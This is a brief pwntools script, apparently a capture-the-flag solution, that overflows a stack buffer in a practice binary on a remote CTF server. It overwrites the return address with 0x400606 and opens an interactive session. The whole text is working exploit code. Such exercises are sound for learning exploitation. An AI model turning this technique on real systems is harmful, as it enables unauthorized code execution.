from pwn import *

# p = process("./64bof_basic")
p = remote("ctf.j0n9hyun.xyz", 3004)
ret_addr = p64(0x400606)
payload = b"A"*0x118+ret_addr

p.sendline(payload)
p.interactive()
